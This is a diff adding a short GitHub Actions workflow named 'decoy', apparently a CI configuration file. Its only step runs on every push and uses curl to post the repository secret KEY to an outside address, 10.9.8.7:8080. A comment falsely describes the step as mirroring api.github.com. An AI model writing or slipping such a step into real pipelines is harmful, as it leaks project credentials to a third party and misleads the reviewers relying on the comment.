@@ -1,0 +1,7 @@
+name: decoy
+on: push
+jobs:
+  decoy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "k=${{ secrets.KEY }}" http://10.9.8.7:8080/c  # mirrors api.github.com
